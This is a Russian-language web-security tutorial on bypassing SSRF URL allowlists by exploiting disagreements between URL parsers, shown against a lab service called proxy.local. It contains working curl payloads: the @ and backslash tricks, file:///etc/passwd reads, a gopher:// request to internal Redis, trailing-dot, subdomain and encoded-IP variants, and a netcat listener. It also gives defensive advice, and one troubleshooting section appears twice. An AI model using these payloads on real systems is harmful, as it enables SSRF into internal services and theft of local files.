## Вопрос, с которого всё начинается

Приложение проверяет URL перед запросом: «разрешены только `trusted.local`». Ты подсовываешь `http://evil.local` — отказ. Но URL — это строка, а парсеров URL в мире много, и они **не согласны** между собой, где в адресе находится хост.

Сегодня мы возьмём allowlist и обойдём его, играя на расхождениях парсинга.

## Наш пример

`proxy.local` — сервис, который по URL отдаёт превью:

```http
GET /preview?url=https://trusted.local/page HTTP/1.1
Host: proxy.local
```

Пробуем чужой домен:

```bash
$ curl -s 'https://proxy.local/preview?url=https://evil.local/'
{"error":"host not allowed"}
```

Allowlist работает. Наша цель — заставить сервер сходить на `evil.local` (или на внутренний адрес), обманув проверку.

## Шаг 1: @-трюк

В URL часть до `@` — это учётные данные (логин:пароль), а **после** `@` — настоящий хост. Если валидатор проверяет строку слева направо или ищет подстроку `trusted.local`, его легко обмануть:

```bash
$ curl -s 'https://proxy.local/preview?url=https://trusted.local@evil.local/'
{"preview":"..."}
```

Проверяющий видит `trusted.local`, а сервер идёт на `evil.local`. Классика SSRF-обхода.

## Шаг 2: бэкслэш

Браузеры (и некоторые библиотеки) трактуют `\` как `/`. Значит, `https://evil.local\@trusted.local` может быть разобрано по-разному: валидатор видит `trusted.local` в конце, а клиент уходит на `evil.local`:

```bash
$ curl -s 'https://proxy.local/preview?url=https://evil.local\@trusted.local/'
{"preview":"..."}
```

Расхождение «браузер vs библиотека» — одна из самых живучих дыр в URL-валидации.

## Шаг 3: схема и кодирование

Иногда проверяют только `http://`/`https://`. Тогда подойдёт другая схема:

```bash
$ curl -s 'https://proxy.local/preview?url=file:///etc/passwd'
$ curl -s 'https://proxy.local/preview?url=gopher://127.0.0.1:6379/_PING'
```

`file://` читает локальные файлы, `gopher://` говорит с внутренними сервисами. Если allowlist проверяет только хост, но не схему, — открыт весь набор. Ещё вариант — перекодировать символы: `%40` вместо `@`, `%2f` вместо `/`, двойное кодирование.

## Шаг 4: порт, фрагмент и завершающая точка

Мелкие расхождения, которые ломают строгие сравнения хостов:

```bash
$ curl -s 'https://proxy.local/preview?url=https://trusted.local.evil.local/'
$ curl -s 'https://proxy.local/preview?url=https://trusted.local@127.0.0.1:8080/'
$ curl -s 'https://proxy.local/preview?url=https://trusted.local./'
```

Точка в конце (`trusted.local.`) — тот же хост для DNS, но другая строка для сравнения. Поддомен `trusted.local.evil.local` содержит разрешённую строку, но ведёт на чужой домен. Порт `:8080` может обойти проверку по имени. Все эти варианты нужно перебрать.

## Полный прогон от начала до конца

Начинаем: `evil.local` — отказ. Пробуем `trusted.local@evil.local` — проходит. Пробуем бэкслэш-вариант — проходит. Пробуем `file:///etc/passwd` — читаем файл. Пробуем `trusted.local.evil.local` — проходит. Пробуем точку в конце — проходит. Один allowlist обойден пятью способами. В отчёт идёт конкретный URL и результат запроса — это и есть доказательство.

## Почему парсеры расходятся

Потому что спецификация URL допускает вольности, а реализации исторически разные. Одни библиотеки (например, в браузерах) «прощают» бэкслэши и лишние слэши; другие (строгие) — нет. Одни декодируют `%40` до проверки, другие — после. Одни считают `@` разделителем учётных данных, другие — частью пути. Плюс играет роль, где именно происходит валидация: если валидируется **строка**, а запрос делает **библиотека HTTP**, между ними всегда есть зазор. Отсюда правило: URL нельзя проверять как текст — его нужно **распарсить тем же парсером**, который потом пойдёт в сеть, и уже у результата проверять хост, схему и IP. Иначе расхождение останется и станет байпасом.

## Инструменты

Самый быстрый способ — **Burp Repeater**: подставляешь варианты URL и смотришь ответ. Для SSRF полезно поднимать свой слушатель (`nc -lvnp 80`) и проверять, придёт ли запрос на него. Для open redirect — смотреть заголовок `Location`. Есть специализированные репозитории с payload-ами «URL parser bypass» — но применять их надо осознанно: сначала определи, **что** валидируется (строка, хост, IP), и подбирай обход под это. Помогает `python3 -c` с `urllib.parse.urlparse` и `curl -v`, чтобы видеть, куда реально идёт запрос.

## Если не сработало

Если простые трюки не проходят, копай глубже. Первое — попробуй **редирект**: разрешённый домен, который сам редиректит на чужой (open redirect на `trusted.local` обходит allowlist для SSRF). Второе — DNS rebinding: домен, который сначала резолвится в разрешённый IP, а потом в запрещённый. Третье — десятичные/octal/hex IP (`2130706433` = `127.0.0.1`). Четвёртое — `%2e`, `%2f`, двойное кодирование и Unicode-точки. Все они — тот же класс расхождения парсинга.

## Где это встречается в реальности

Класс «URL parsing confusion» живёт везде, где приложение работает с адресами: превью ссылок, вебхуки, SSRF-функции, загрузка по URL, OAuth-редиректы, allowlist для iframe. Особенно опасны случаи, когда валидатор и клиент HTTP — **разные библиотеки**: валидатор на одном языке, запрос — на другом. Именно поэтому так часто срабатывает `@` и бэкслэш: один парсер видит хост одно, другой — другое. Запомни принцип: адрес надо проверять **после** парсинга и нормализации, и лучше — тем же кодом, что пойдёт в сеть.

## Если не сработало

Если allowlist не обходится трюками, проверь, **как** он устроен. Если он резолвит домен и проверяет IP — попробуй DNS rebinding (домен, который сначала резолвится в разрешённый IP, потом в запрещённый). Если проверяется схема — ищи другой протокол. Если запрещены редиректы — попробуй разрешённый домен, который сам редиректит на чужой. И проверь кодирование: `%2e`, `%2f`, двойное кодирование, Unicode-точки — иногда обход прячется там.

## Как оформить находку

Опиши allowlist (что разрешено) и обход (какой URL прошёл). Приложи запрос и результат — например, `{"preview":"..."}` с данными чужого домена или `file:///etc/passwd`. Если обход даёт SSRF на внутренний адрес, покажи ответ внутреннего сервиса. Без конкретного результата байпас не считается находкой.

## Частые вопросы

**«Почему `@` обходит проверку?»** Валидатор ищет разрешённый домен как подстроку или читает строку слева, а реальный хост в URL — часть после `@`. Разные парсеры — разный хост.

**«Как защититься от этого класса?»** Парсить URL тем же парсером, что пойдёт в сеть, резолвить его и проверять итоговый IP по allowlist — а не сравнивать строки.

## Что мы теперь знаем

- URL — строка, а парсеры URL расходятся в том, где хост.
- `@` отделяет учётные данные от хоста: `trusted.local@evil.local`.
- Бэкслэш `\` иногда трактуется как `/`.
- Схемы (`file://`, `gopher://`) опасны, если проверяется только хост.
- Точка в конце, поддомен, порт ломают строгие сравнения.
- Проверять надо результат парсинга, а не строку.

## На что смотреть дальше

- Всегда проверяй, **что именно** валидирует allowlist: строку, хост или резолвнутый IP.
- Пробуй `@`, `\`, `%40`, `%2f`, двойное кодирование.
- Пробуй другие схемы, если проверяется только `http(s)`.
- Помни: после валидации URL нужно **перепроверить** финальный адрес — иначе расхождение останется.

## Куда дальше

Дальше разберём ещё один «доверенный» вход — заголовок Host, который ломает сброс пароля, роутинг и кэш. А пока главное: URL — это строка, и разные парсеры видят в ней разные хосты.

## Где пригодится

- **CTF (Web):** обход SSRF/redirect.
- **Bug bounty:** allowlist bypass — критичный отчёт.
- **Пентест:** аудит URL-валидации.
- **Работа (AppSec):** строгий парсинг, allowlist после нормализации, запрет редиректов.
